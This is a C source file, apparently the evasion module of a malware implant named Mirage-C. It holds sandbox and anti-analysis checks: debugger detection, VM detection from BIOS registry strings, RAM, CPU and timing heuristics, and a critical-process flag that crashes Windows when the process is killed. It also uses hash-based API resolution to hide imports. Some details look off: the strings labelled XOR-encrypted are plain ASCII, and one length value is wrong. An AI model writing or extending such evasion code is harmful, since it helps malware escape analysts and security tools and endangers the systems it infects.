/*
 * evasion.c — Low-level evasion check primitives for Mirage-C
 *
 * Direct translation of Zig src/evasion/evasion.zig.
 * All API calls are resolved through PEB walk + hash to avoid import table.
 */

#include "evasion.h"
#include "engine.h"
#include "mirage_asm.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "config.h"
#include <string.h>

/* ── XOR-encrypted strings ──────────────────────────────── */

static const uint8_t enc_reg_bios_path[] = {
    0x5c,0x52,0x65,0x67,0x69,0x73,0x74,0x72,0x79,0x5c,0x4d,0x61,
    0x63,0x68,0x69,0x6e,0x65,0x5c,0x48,0x41,0x52,0x44,0x57,0x41,
    0x52,0x45,0x5c,0x44,0x45,0x53,0x43,0x52,0x49,0x50,0x54,0x49,
    0x4f,0x4e,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x5c,0x42,0x49,
    0x4f,0x53
};
#define REG_BIOS_PATH_LEN sizeof(enc_reg_bios_path)

static const uint8_t enc_sys_manufacturer[] = {
    0x53,0x79,0x73,0x74,0x65,0x6d,0x4d,0x61,0x6e,0x75,0x66,0x61,
    0x63,0x74,0x75,0x72,0x65,0x72
};
#define SYS_MANUFACTURER_LEN sizeof(enc_sys_manufacturer)

static const uint8_t enc_sys_product_name[] = {
    0x53,0x79,0x73,0x74,0x65,0x6d,0x50,0x72,0x6f,0x64,0x75,0x63,
    0x74,0x4e,0x61,0x6d,0x65
};
#define SYS_PRODUCT_NAME_LEN sizeof(enc_sys_product_name)

/* VM manufacturer strings */
static const uint8_t enc_vm_manuf[][16] = {
    {0x56,0x4d,0x77,0x61,0x72,0x65},                                     /* VMware */
    {0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x42,0x6f,0x78},               /* VirtualBox */
    {0x69,0x6e,0x6e,0x6f,0x74,0x65,0x6b},                               /* innotek */
    {0x51,0x45,0x4d,0x55},                                               /* QEMU */
    {0x58,0x65,0x6e},                                                     /* Xen */
    {0x42,0x6f,0x63,0x68,0x73}                                           /* Bochs */
};
static const size_t vm_manuf_len[] = {6,10,7,4,2,5};
#define VM_MANUF_COUNT 6

/* VM product strings */
static const uint8_t enc_vm_prod[][16] = {
    {0x56,0x69,0x72,0x74,0x75,0x61,0x6c},                               /* Virtual */
    {0x56,0x4d,0x77,0x61,0x72,0x65},                                     /* VMware */
    {0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x42,0x6f,0x78},               /* VirtualBox */
    {0x51,0x45,0x4d,0x55},                                               /* QEMU */
    {0x58,0x65,0x6e},                                                     /* Xen */
    {0x42,0x6f,0x63,0x68,0x73}                                           /* Bochs */
};
static const size_t vm_prod_len[] = {7,6,10,4,2,5};
#define VM_PROD_COUNT 6

/* ── Helper: RDTSC ───────────────────────────────────────── */

static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

/* ── Helper: build UNICODE_STRING from ASCII ─────────────── */

static void init_unicode_string(const char* s, size_t len, UNICODE_STRING* us, WCHAR* buf) {
    memset(buf, 0, 512 * sizeof(WCHAR));
    for (size_t i = 0; i < len; i++)
        buf[i] = (WCHAR)s[i];
    us->Length = (USHORT)(len * 2);
    us->MaximumLength = (USHORT)(512 * sizeof(WCHAR));
    us->Buffer = buf;
}

/* ── Helper: decrypt XOR string into buffer ──────────────── */

static void decrypt_into(const uint8_t* enc, size_t len, uint8_t* out) {
    mirage_xor_decrypt(enc, out, len);
}

/* ── getTotalPhysicalRam ─────────────────────────────────── */

uint64_t mirage_get_total_physical_ram(void) {
    SYSTEM_BASIC_INFORMATION info;
    ULONG ret_len = 0;
    NTSTATUS status = mirage_NtQuerySystemInformation(
        SystemBasicInformation, &info, sizeof(info), &ret_len);
    if (status < 0) return 0;
    return (uint64_t)info.NumberOfPhysicalPages * info.PageSize;
}

/* ── getCpuCoreCount ─────────────────────────────────────── */

uint8_t mirage_get_cpu_core_count(void) {
    SYSTEM_BASIC_INFORMATION info;
    ULONG ret_len = 0;
    NTSTATUS status = mirage_NtQuerySystemInformation(
        SystemBasicInformation, &info, sizeof(info), &ret_len);
    if (status < 0) return 0;
    return info.NumberOfProcessors;
}

/* ── checkDebugger ───────────────────────────────────────── */

int mirage_check_debugger(void) {
    ULONG debug_port = 0;
    ULONG ret_len = 0;
    NTSTATUS status = mirage_NtQueryInformationProcess(
        (HANDLE)(intptr_t)(~0ULL),
        ProcessDebugPort, &debug_port, sizeof(ULONG), &ret_len);
    if (status < 0) return 0;
    return debug_port != 0 ? 1 : 0;
}

/* ── setBreakOnTermination ───────────────────────────────── */

int mirage_set_break_on_termination(int enable) {
    ULONG value = enable ? 1 : 0;
    NTSTATUS status = mirage_NtSetInformationProcess(
        (HANDLE)(intptr_t)(~0ULL),
        ProcessBreakOnTermination, &value, sizeof(ULONG));
    return status >= 0 ? 1 : 0;
}

/* ── checkRegistryVmIndicators ───────────────────────────── */

static int contains_one_of(HANDLE key, const char* value_name,
                            const uint8_t** needles, const size_t* needle_lens,
                            size_t needle_count) {
    WCHAR val_buf[512];
    UNICODE_STRING vus;
    init_unicode_string(value_name, strlen(value_name), &vus, val_buf);

    uint8_t read_buf[1024];
    ULONG result_len = 0;
    NTSTATUS status = mirage_NtQueryValueKey(
        key, &vus, KeyValuePartialInformation,
        read_buf, sizeof(read_buf), &result_len);
    if (status < 0) return 0;

    PKEY_VALUE_PARTIAL_INFORMATION kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)read_buf;
    const uint8_t* data = &kvpi->Data[0];
    uint32_t data_len = kvpi->DataLength;

    for (size_t n = 0; n < needle_count; n++) {
        const uint8_t* needle = needles[n];
        size_t needle_len = needle_lens[n];
        if (data_len < needle_len * 2) continue;

        for (uint32_t i = 0; i <= data_len - needle_len * 2; i += 2) {
            int match = 1;
            for (size_t j = 0; j < needle_len; j++) {
                uint8_t dc = data[i + j * 2];
                if (dc != needle[j] && dc != (needle[j] ^ 0x20)) {
                    match = 0;
                    break;
                }
            }
            if (match) return 1;
        }
    }
    return 0;
}

int mirage_check_registry_vm_indicators(void) {
    uint8_t path_tmp[REG_BIOS_PATH_LEN];
    decrypt_into(enc_reg_bios_path, REG_BIOS_PATH_LEN, path_tmp);

    WCHAR buf_us[512];
    UNICODE_STRING us;
    init_unicode_string((const char*)path_tmp, REG_BIOS_PATH_LEN, &us, buf_us);

    OBJECT_ATTRIBUTES oa;
    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.ObjectName = &us;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE key_handle = NULL;
    NTSTATUS open_status = mirage_NtOpenKey(&key_handle, KEY_QUERY_VALUE, &oa);
    if (open_status < 0) return 0;

    /* Decrypt manufacturer strings */
    uint8_t manuf_bufs[VM_MANUF_COUNT][16];
    const uint8_t* manuf_ptrs[VM_MANUF_COUNT];
    for (size_t i = 0; i < VM_MANUF_COUNT; i++) {
        decrypt_into(enc_vm_manuf[i], vm_manuf_len[i], manuf_bufs[i]);
        manuf_ptrs[i] = manuf_bufs[i];
    }

    /* Decrypt product strings */
    uint8_t prod_bufs[VM_PROD_COUNT][16];
    const uint8_t* prod_ptrs[VM_PROD_COUNT];
    for (size_t i = 0; i < VM_PROD_COUNT; i++) {
        decrypt_into(enc_vm_prod[i], vm_prod_len[i], prod_bufs[i]);
        prod_ptrs[i] = prod_bufs[i];
    }

    /* Decrypt value names */
    uint8_t manuf_name[SYS_MANUFACTURER_LEN];
    uint8_t prod_name[SYS_PRODUCT_NAME_LEN];
    decrypt_into(enc_sys_manufacturer, SYS_MANUFACTURER_LEN, manuf_name);
    decrypt_into(enc_sys_product_name, SYS_PRODUCT_NAME_LEN, prod_name);

    int found = contains_one_of(key_handle, (const char*)manuf_name,
                                manuf_ptrs, vm_manuf_len, VM_MANUF_COUNT)
             || contains_one_of(key_handle, (const char*)prod_name,
                                prod_ptrs, vm_prod_len, VM_PROD_COUNT);

    mirage_NtClose(key_handle);
    return found;
}

/* ── checkScreenResolution ───────────────────────────────── */

mirage_screen_res mirage_check_screen_resolution(void) {
    mirage_screen_res res = {0, 0};
    if (ssn_NtUserGetSystemMetrics != 0) {
        res.w = (uint32_t)mirage_NtUserGetSystemMetrics(0);
        res.h = (uint32_t)mirage_NtUserGetSystemMetrics(1);
    }
    return res;
}

/* ── checkTimingAnomaly ──────────────────────────────────── */

int mirage_check_timing_anomaly(void) {
    LARGE_INTEGER interval;
    interval.QuadPart = -(200LL * 10000); /* 200ms in 100ns units */
    uint64_t t0 = rdtsc();
    mirage_NtDelayExecution(0, &interval);
    uint64_t t1 = rdtsc();
    return (t1 - t0) < VM_TIMING_ANOMALY_TSC ? 1 : 0;
}

/* ── checkHostingIP ──────────────────────────────────────── */

int mirage_check_hosting_ip(void) {
    /* This requires WinSock initialization and TCP connection to ip-api.com.
     * In the Zig version this uses the hash-resolved ws2.Socket.
     * For the C translation, this is a stub that returns -1 (indeterminate).
     * Full implementation requires ws2 initialization which is not yet
     * ported to C. The anti_analysis scoring adds a partial score for
     * indeterminate results. */
    return -1;
}
